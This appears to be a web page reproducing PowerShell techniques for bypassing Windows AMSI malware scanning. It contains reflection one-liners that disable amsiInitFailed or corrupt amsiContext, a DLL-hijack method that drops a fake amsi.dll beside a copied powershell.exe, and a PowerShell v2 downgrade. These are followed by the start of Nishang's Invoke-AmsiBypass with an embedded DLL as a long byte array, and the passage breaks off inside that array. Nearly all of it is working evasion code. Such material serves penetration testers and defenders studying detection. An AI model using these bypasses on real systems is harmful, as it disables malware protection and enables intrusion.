[String].Assembly.GetType(\u0026#39;System.T\u0026#39;+\u0026#39;ype\u0026#39;)), [Object]([Ref].Assembly.GetType(\u0026#39;System.Management.Automation.AmsiUtils\u0026#39;)),(\u0026#39;GetFie\u0026#39;+\u0026#39;ld\u0026#39;)).Invoke(\u0026#39;amsiInitFailed\u0026#39;,((\u0026#39;Non\u0026#39;+\u0026#39;Public,Static\u0026#39;) -as [String].Assembly.GetType(\u0026#39;System.Reflection.Bindin\u0026#39;+\u0026#39;gFlags\u0026#39;))).SetValue($null,$True) Using Matt Graebers second Reflection method # [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(\u0026#39;System.Management.Automation.AmsiUtils\u0026#39;).GetField(\u0026#39;amsiContext\u0026#39;,[Reflection.BindingFlags]\u0026#39;NonPublic,Static\u0026#39;).GetValue($null),0x41414141) Using Cornelis de Plaas DLL hijack method # [Byte[]] $temp = $DllBytes -split \u0026#39; \u0026#39; Write-Output \u0026#34;Executing the bypass.\u0026#34; Write-Verbose \u0026#34;Dropping the fake amsi.dll to disk.\u0026#34; [System.IO.File]::WriteAllBytes(\u0026#34;$pwd\\amsi.dll\u0026#34;, $temp) Write-Verbose \u0026#34;Copying powershell.exe to the current working directory.\u0026#34; Copy-Item -Path C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Destination $pwd Write-Verbose \u0026#34;Starting powershell.exe from the current working directory.\u0026#34; \u0026amp; \u0026#34;$pwd\\powershell.exe\u0026#34; Using PowerShell version 2 # if ($ShowOnly -eq $True) { Write-Output \u0026#34;If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process.\u0026#34; } else { Write-Verbose \u0026#34;Checking if .Net version 2.0.50727 is installed.\u0026#34; $versions = Get-ChildItem \u0026#39;HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\u0026#39; -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match \u0026#39;^(?!S)\\p{L}\u0026#39;} | Select -ExpandProperty Version if($versions -match \u0026#34;2.0.50727\u0026#34;) { Write-Verbose \u0026#34;.Net version 2.0.50727 found.\u0026#34; Write-Output \u0026#34;Executing the bypass.\u0026#34; powershell.exe -version 2 } else { Write-Verbose \u0026#34;.Net version 2.0.50727 not found. Can\u0026#39;t start PowerShell v2.\u0026#34; } } Nishang all in one # function Invoke-AmsiBypass { \u0026lt;# .SYNOPSIS Nishang script which uses publicly known methods to bypass/avoid AMSI. .DESCRIPTION This script implements publicly known methods bypass or avoid AMSI on Windows machines. AMSI is a script malware detection mechanism enabled by default in Windows 10. (https://msdn.microsoft.com/en-us/library/windows/desktop/dn889587(v=vs.85).aspx) This script implements 6 methods of bypassing AMSI. unload - Method by Matt Graeber. Unloads AMSI from current PowerShell session. unload2 - Another method by Matt Graeber. Unloads AMSI from current PowerShell session. unloadsilent - Another method by Matt Graeber. Unloads AMSI and avoids WMF5 autologging. unloadobfuscated - \u0026#39;unload\u0026#39; method above obfuscated with Daneil Bohannon\u0026#39;s Invoke-Obfuscation - which avoids WMF5 autologging. dllhijack - Method by Cornelis de Plaa. The amsi.dll used in the code is from p0wnedshell (https://github.com/Cn33liz/p0wnedShell) psv2 - If .net 2.0.50727 is available on Windows 10. PowerShell v2 is launched which doesn\u0026#39;t support AMSI. The script also provides information on tools which can be used for obfuscation: ISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/) Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation) .PARAMETER Method The method to be used for elevation. Defaut one is unloadsilent. .PARAMETER ShowOnly The bypass is not executed. Just shown to the user. .EXAMPLE PS \u0026gt; Invoke-AmsiBypass -Verbose Above command runs the unloadsilent method. .EXAMPLE PS \u0026gt; Invoke-PsUACme -Method unloadobfuscated -Verbose Above command runs the unloadobfuscated method. .LINK http://www.labofapenetrationtester.com/2016/09/amsi.html https://github.com/samratashok/nishang #\u0026gt; [CmdletBinding()] Param( [Parameter(Position = 0, Mandatory = $False)] [ValidateSet(\u0026#34;unload\u0026#34;,\u0026#34;unloadsilent\u0026#34;,\u0026#34;unloadobfuscated\u0026#34;,\u0026#34;unload2\u0026#34;,\u0026#34;dllhijack\u0026#34;,\u0026#34;psv2\u0026#34;,\u0026#34;obfuscation\u0026#34;)] [String] $Method = \u0026#34;unloadsilent\u0026#34;, [Parameter(Position = 1, Mandatory = $False)] [Switch] $ShowOnly ) $AmsiX86 = \u0026#34;77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 0 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 190 171 71 149 250 202 41 198 250 202 41 198 250 202 41 198 243 178 186 198 248 202 41 198 148 145 40 199 249 202 41 198 148 145 42 199 251 202 41 198 148 145 44 199 242 202 41 198 148 145 45 199 241 202 41 198 39 53 226 198 248 202 41 198 250 202 40 198 231 202 41 198 40 145 33 199 251 202 41 198 40 145 214 198 251 202 41 198 40 145 43 199 251 202 41 198 82 105 99 104 250 202 41 198 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 76 1 6 0 144 29 62 87 0 0 0 0 0 0 0 0 224 0 2 33 11 1 14 0 0 14 0 0 0 18 0 0 0 0 0 0 43 19 0 0 0 16 0 0 0 32 0 0 0 0 0 16 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 112 0 0 0 4 0 0 0 0 0 0 2 0 64 1 0 0 16 0 0 16 0 0 0 0 16 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 148 36 0 0 80 0 0 0 0 80 0 0 224 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 96 0 0 44 1 0 0 176 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 33 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 124 12 0 0 0 16 0 0 0 14 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 220 7 0 0 0 32 0 0 0 8 0 0 0 18 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 136 3 0 0 0 48 0 0 0 2 0 0 0 26 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 103 102 105 100 115 0 0 20 0 0 0 0 64 0 0 0 2 0 0 0 28 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 80 0 0 0 2 0 0 0 30 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 44 1 0 0 0 96 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 194 12 0 59 13 4 48 0 16 242 117 2 242 195 242 233 96 3 0 0 85 139 236 139 69 12 131 232 0 116 51 131 232 1 116 32 131 232 1 116 17 131 232 1 116 5 51 192 64 235 48 232 245 4 0 0 235 5 232 207 4 0 0 15 182 192 235 31 255 117 16 255 117 8 232 24 0 0 0 89 235 16 131 125 16 0 15 149 192 15 182 192 80 232 23 1 0 0 89 93 194 12 0 106 16 104 24 36 0 16 232 123 9 0 0 106 0 232 35 5 0 0 89 132 192 117 7 51 192 233 224 0 0 0 232 40 4 0 0 136 69 227 179 1 136 93 231 131 101 252 0 131 61 60 51 0 16 0 116 7 106 7 232 203 7 0 0 199 5 60 51 0 16 1 0 0 0 232 74 4 0 0 132 192 116 101 232 206 8 0 0 104 186 25 0 16 232 177 6 0 0 232 93 7 0 0 199 4 36 57 24 0 16 232 160 6 0 0 232 112 7 0 0 199 4 36 128 32 0 16 104 124 32 0 16 232 78 11 0 0 89 89 133 192 117 41 232 237 3 0 0 132 192 116 32 104 120 32 0 16 104 116 32 0 16 232 42 11 0 0 89 89 199 5 60 51 0 16 2 0 0 0 50 219 136 93 231 199 69 252 254 255 255 255 232 68 0 0 0 132 219 15 133 76 255 255 255 232 52 7 0 0 139 240 131 62 0 116 30 86 232 40 5 0 0 89 132 192 116 19 255 117 12 106 2 255 117 8 139 54 139 206 232 136 8 0 0 255 214 255 5 24 48 0 16 51 192 64 232 201 8 0 0 195 138 93 231 255 117 227 232 131 5 0 0 89 195 106 12 104 56 36 0 16 232 105 8 0 0 161 24 48 0 16 133 192 127 4 51 192 235 79 72 163 24 48 0 16 232 22 3 0 0 136 69 228 131 101 252 0 131 61 60 51 0 16 2 116 7 106 7 232 190 6 0 0 232 180 3 0 0 131 37 60 51 0 16 0 199 69 252 254 255 255 255 232 27 0 0 0 106 0 255 117 8 232 65 5 0 0 89 89 51 201 132 192 15 149 193 139 193 232 78 8 0 0 195 232 164 3 0 0 255 117 228 232 6 5 0 0 89 195 106 12 104 88 36 0 16 232 236 7 0 0 131 101 252 0 139 125 12 131 255 1 116 10 131 255 2 116 5 139 93 8 235 49 255 117 16 87 139 93 8 83 232 218 0 0 0 139 240 137 117 228 133 246 15 132 190 0 0 0 255 117 16 87 83 232 216 253 255 255 139 240 137 117 228 133 246 15 132 167 0 0 0 131 255 1 117 7 83 232 198 9 0 0 89 255 117 16 87 83 232 159 253 255 255 139 240 137 117 228 131 255 1 117 43 133 246 117 30 255 117 16 80 83 232 135 253 255 255 255 117 16 86 83 232 147 253 255 255 255 117 16 86 83 232 116 0 0 0 131 255 1 117 4 133 246 116 4 133 255 117 11 83 232 130 9 0 0 89 133 255 116 5 131 255 3 117 72 255 117 16 87 83 232 98 253 255 255 139 240 137 117 228 133 246 116 53 255 117 16 87 83 232 58 0 0 0 139 240 235 36 139 77 236 139 1 81 255 48 104 22 16 0 16 255 117 16 255 117 12 255 117 8 232 86 2 0 0 131 196 24 195 139 101 232 51 246 137 117 228 199 69 252 254 255 255 255 139 198 232 54 7 0 0 195 85 139 236 86 139 53 160 32 0 16 133 246 117 5 51 192 64 235 18 255 117 16 139 206 255 117 12 255 117 8 232 193 6 0 0 255 214 94 93 194 12 0 85 139 236 131 125 12 1 117 5 232 88 4 0 0 255 117 16 255 117 12 255 117 8 232 177 254 255 255 131 196 12 93 194 12 0 85 139 236 106 0 255 21 40 32 0 16 255 117 8 255 21 0 32 0 16 104 9 4 0 192 255 21 4 32 0 16 80 255 21 8 32 0 16 93 195 85 139 236 129 236 36 3 0 0 106 23 232 234 8 0 0 133 192 116 5 106 2 89 205 41 163 32 49 0 16 137 13 28 49 0 16 137 21 24 49 0 16 137 29 20 49 0 16 137 53 16 49 0 16 137 61 12 49 0 16 102 140 21 56 49 0 16 102 140 13 44 49 0 16 102 140 29 8 49 0 16 102 140 5 4 49 0 16 102 140 37 0 49 0 16 102 140 45 252 48 0 16 156 143 5 48 49 0 16 139 69 0 163 36 49 0 16 139 69 4 163 40 49 0 16 141 69 8 163 52 49 0 16 139 133 220 252 255 255 199 5 112 48 0 16 1 0 1 0 161 40 49 0 16 163 44 48 0 16 199 5 32 48 0 16 9 4 0 192 199 5 36 48 0 16 1 0 0 0 199 5 48 48 0 16 1 0 0 0 106 4 88 107 192 0 199 128 52 48 0 16 2 0 0 0 106 4 88 107 192 0 139 13 4 48 0 16 137 76 5 248 106 4 88 193 224 0 139 13 0 48 0 16 137 76 5 248 104 164 32 0 16 232 225 254 255 255 139 229 93 195 85 139 236 139 69 8 86 139 72 60 3 200 15 183 65 20 141 81 24 3 208 15 183 65 6 107 240 40 3 242 59 214 116 25 139 77 12 59 74 12 114 10 139 66 8 3 66 12 59 200 114 12 131 194 40 59 214 117 234 51 192 94 93 195 139 194 235 249 232 85 7 0 0 133 192 117 3 50 192 195 100 161 24 0 0 0 86 190 64 51 0 16 139 80 4 235 4 59 208 116 16 51 192 139 202 240 15 177 14 133 192 117 240 50 192 94 195 176 1 94 195 232 32 7 0 0 133 192 116 7 232 118 5 0 0 235 5 232 77 7 0 0 176 1 195 106 0 232 207 0 0 0 132 192 89 15 149 192 195 232 97 7 0 0 132 192 117 3 50 192 195 232 85 7 0 0 132 192 117 7 232 76 7 0 0 235 237 176 1 195 232 66 7 0 0 232 61 7 0 0 176 1 195 85 139 236 232 203 6 0 0 133 192 117 24 131 125 12 1 117 18 255 117 16 139 77 20 80 255 117 8 232 136 4 0 0 255 85 20 255 117 28 255 117 24 232 219 6 0 0 89 89 93 195 232 155 6 0 0 133 192 116 12 104 68 51 0 16 232 220 6 0 0 89 195 232 240 6 0 0 133 192 15 132 217 6 0 0 195 106 0 232 221 6 0 0 89 233 215 6 0 0 85 139 236 131 125 8 0 117 7 198 5 92 51 0 16 1 232 186 4 0 0 232 189 6 0 0 132 192 117 4 50 192 93 195 232 176 6 0 0 132 192 117 10 106 0 232 165 6 0 0 89 235 233 176 1 93 195 85 139 236 131 236 12 86 139 117 8 133 246 116 5 131 254 1 117 124 232 31 6 0 0 133 192 116 42 133 246 117 38 104 68 51 0 16 232 80 6 0 0 89 133 192 116 4 50 192 235 87 104 80 51 0 16 232 61 6 0 0 247 216 89 26 192 254 192 235 68 161 4 48 0 16 141 117 244 87 131 224 31 191 68 51 0 16 106 32 89 43 200 131 200 255 211 200 51 5 4 48 0 16 137 69 244 137 69 248 137 69 252 165 165 165 191 80 51 0 16 137 69 244 137 69 248 141 117 244 137 69 252 176 1 165 165 165 95 94 139 229 93 195 106 5 232 6 2 0 0 204 106 8 104 120 36 0 16 232 117 3 0 0 131 101 252 0 184 77 90 0 0 102 57 5 0 0 0 16 117 96 161 60 0 0 16 129 184 0 0 0 16 80 69 0 0 117 79 185 11 1 0 0 102 57 136 24 0 0 16 117 65 139 69 8 185 0 0 0 16 43 193 80 81 232 180 253 255 255 89 89 133 192 116 42 247 64 36 0 0 0 128 117 33 199 69 252 254 255 255 255 176 1 235 31 139 69 236 139 0 51 201 129 56 5 0 0 192 15 148 193 139 193 195 139 101 232 199 69 252 254 255 255 255 50 192 232 59 3 0 0 195 85 139 236 232 11 5 0 0 133 192 116 15 128 125 8 0 117 9 51 192 185 64 51 0 16 135 1 93 195 85 139 236 128 61 92 51 0 16 0 116 6 128 125 12 0 117 18 255 117 8 232 67 5 0 0 255 117 8 232 59 5 0 0 89 89 176 1 93 195 85 139 236 161 4 48 0 16 139 200 51 5 68 51 0 16 131 225 31 255 117 8 211 200 131 248 255 117 7 232 1 5 0 0 235 11 104 68 51 0 16 232 233 4 0 0 89 247 216 89 27 192 247 208 35 69 8 93 195 85 139 236 255 117 8 232 186 255 255 255 247 216 89 27 192 247 216 72 93 195 85 139 236 131 236 20 131 101 244 0 131 101 248 0 161 4 48 0 16 86 87 191 78 230 64 187 190 0 0 255 255 59 199 116 13 133 198 116 9 247 208 163 0 48 0 16 235 102 141 69 244 80 255 21 28 32 0 16 139 69 248 51 69 244 137 69 252 255 21 32 32 0 16 49 69 252 255 21 36 32 0 16 49 69 252 141 69 236 80 255 21 16 32 0 16 139 77 240 141 69 252 51 77 236 51 77 252 51 200 59 207 117 7 185 79 230 64 187 235 16 133 206 117 12 139 193 13 17 71 0 0 193 224 16 11 200 137 13 4 48 0 16 247 209 137 13 0 48 0 16 95 94 139 229 93 195 104 96 51 0 16 255 21 24 32 0 16 195 104 96 51 0 16 232 229 3 0 0 89 195 184 104 51 0 16 195 184 112 51 0 16 195 232 239 255 255 255 139 72 4 131 8 4 137 72 4 232 231 255 255 255 139 72 4 131 8 2 137 72 4 195 184 132 51 0 16 195 85 139 236 129 236 36 3 0 0 83 86 106 23 232 234 3 0 0 133 192 116 5 139 77 8 205 41 51 246 141 133 220 252 255 255 104 204 2 0 0 86 80 137 53 120 51 0 16 232 133 3 0 0 131 196 12 137 133 140 253 255 255 137 141 136 253 255 255 137 149 132 253 255 255 137 157 128 253 255 255 137 181 124 253 255 255 137 189 120 253 255 255 102 140 149 164 253 255 255 102 140 141 152 253 255 255 102 140 157 116 253 255 255 102 140 133 112 253 255 255 102 140 165 108 253 255 255 102 140 173 104 253 255 255 156 143 133 156 253 255 255 139 69 4 137 133 148 253 255 255 141 69 4 137 133 160 253 255 255 199 133 220 252 255 255 1 0 1 0 139 64 252 106 80 137 133 144 253 255 255 141 69 168 86 80 232 252 2 0 0 139 69 4 131 196 12 199 69 168 21 0 0 64 199 69 172 1 0 0 0 137 69 180 255 21 20 32 0 16 86 141 88 255 247 219 141 69 168 137 69 248 141 133 220 252 255 255 26 219 137 69 252 254 195 255 21 40 32 0 16 141 69 248 80 255 21 0 32 0 16 133 192 117 13 15 182 195 247 216 27 192 33 5 120 51 0 16 94 91 139 229 93 195 83 86 190 8 36 0 16 187 8 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 56 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 83 86 190 16 36 0 16 187 16 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 13 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 255 37 112 32 0 16 204 204 204 204 204 104 75 26 0 16 100 255 53 0 0 0 0 139 68 36 16 137 108 36 16 141 108 36 16 43 224 83 86 87 161 4 48 0 16 49 69 252 51 197 80 137 101 232 255 117 248 139 69 252 199 69 252 254 255 255 255 137 69 248 141 69 240 100 163 0 0 0 0 242 195 139 77 240 100 137 13 0 0 0 0 89 95 95 94 91 139 229 93 81 242 195 85 139 236 255 117 20 255 117 16 255 117 12 255 117 8 104 5 16 0 16 104 4 48 0 16 232 203 1 0 0 131 196 24 93 195 85 139 236 131 37 124 51 0 16 0 131 236 44 83 51 219 67 9 29 16 48 0 16 106 10 232 228 1 0 0 133 192 15 132 116 1 0 0 131 101 236 0 51 192 131 13 16 48 0 16 2 51 201 86 87 137 29 124 51 0 16 141 125 212 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 139 69 212 139 77 224 137 69 244 129 241 105 110 101 73 139 69 220 53 110 116 101 108 11 200 139 69 216 53 71 101 110 117 11 200 247 217 106 1 88 26 201 106 0 128 193 1 89 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 116 67 139 69 212 37 240 63 255 15 61 192 6 1 0 116 35 61 96 6 2 0 116 28 61 112 6 2 0 116 21 61 80 6 3 0 116 14 61 96 6 3 0 116 7 61 112 6 3 0 117 17 139 61 128 51 0 16 131 207 1 137 61 128 51 0 16 235 6 139 61 128 51 0 16 131 125 244 7 139 69 224 137 69 228 139 69 220 137 69 248 137 69 232 124 50 106 7 88 51 201 83 15 162 139 243 91 141 93 212 137 3 137 115 4 137 75 8 137 83 12 139 69 216 169 0 2 0 0 137 69 236 139 69 248 116 9 131 207 2 137 61 128 51 0 16 95 94 169 0 0 16 0 116 109 131 13 16 48 0 16 4 199 5 124 51 0 16 2 0 0 0 169 0 0 0 8 116 85 169 0 0 0 16 116 78 51 201 15 1 208 137 69 240 137 85 244 139 69 240 139 77 244 131 224 6 51 201 131 248 6 117 51 133 201 117 47 161 16 48 0 16 131 200 8 199 5 124 51 0 16 3 0 0 0 246 69 236 32 163 16 48 0 16 116 18 131 200 32 199 5 124 51 0 16 5 0 0 0 163 16 48 0 16 51 192 91 139 229 93 195 51 192 57 5 20 48 0 16 15 149 192 195 195 255 37 52 32 0 16 255 37 60 32 0 16 255 37 56 32 0 16 255 37 48 32 0 16 255 37 64 32 0 16 255 37 104 32 0 16 255 37 100 32 0 16 255 37 96 32 0 16 255 37 92 32 0 16 255 37 88 32 0 16 255 37 84 32 0 16 255 37 80 32 0 16 255 37 76 32 0 16 255 37 72 32 0 16 255 37 12 32 0 16 176 1 195 51 192 195 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 27 28 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 48 0 16 112 48 0 16 0 0 0 0 0 0 0 0 144 29 62 87 0 0 0 0 2 0 0 0 61 0 0 0 132 33 0 0 132 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 196 33 0 0 196 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 13 0 0 0 44 2 0 0 216 33 0 0 216 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 92 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 4 48 0 16 128 33 0 16 1 0 0 0 112 32 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 75 26 0 0 82 83 68 83 69 10 117 219 0 114 41 77 133 149 98 78 29 103 122 248 7 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 20 0 0 0 20 0 0 0 1 0 0 0 19 0 0 0 71 67 84 76 0 16 0 0 124 12 0 0 46 116 101 120 116 36 109 110 0 0 0 0 0 32 0 0 112 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 112 32 0 0 4 0 0 0 46 48 48 99 102 103 0 0 116 32 0 0 4 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 120 32 0 0 4 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 124 32 0 0 4 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 128 32 0 0 4 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 132 32 0 0 4 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 136 32 0 0 4 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 140 32 0 0 4 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 144 32 0 0 4 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 160 32 0 0 220 0 0 0 46 114 100 97 116 97 0 0 128 33 0 0 4 0 0 0 46 114 100 97 116 97 36 115 120 100 97 116 97 0 0 0 132 33 0 0 128 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 4 36 0 0 4 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 8 36 0 0 4 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 12 36 0 0 4 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 16 36 0 0 4 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 24 36 0 0 124 0 0 0 46 120 100 97 116 97 36 120 0 0 0 0 148 36 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 208 36 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 228 36 0 0 112 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 84 37 0 0 136 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 24 0 0 0 46 100 97 116 97 0 0 0 24 48 0 0 112 3 0 0 46 98 115 115 0 0 0 0 0 64 0 0 20 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 80 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 80 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 254 255 255 255 0 0 0 0 208 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 110 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 233 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 203 18 0 16 234 18 0 16 0 0 0 0 254 255 255 255 0 0 0 0 216 255 255 255 0 0 0 0 254 255 255 255 215 22 0 16 234 22 0 16 20 37 0 0 0 0 0 0 0 0 0 0 220 37 0 0 48 32 0 0 44 37 0 0 0 0 0 0 0 0 0 0 164 38 0 0 72 32 0 0 228 36 0 0 0 0 0 0 0 0 0 0 206 39 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 72 0 109 101 109 115 101 116 0 0 53 0 95 101 120 99 101 112 116 95 104 97 110 100 108 101 114 52 95 99 111 109 109 111 110 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 56 0 95 105 110 105 116 116 101 114 109 0 57 0 95 105 110 105 116 116 101 114 109 95 101 0 65 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 53 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 54 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 62 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 36 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 31 0 95 99 114 116 95 97 116 101 120 105 116 0 23 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 130 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 67 5 83 101 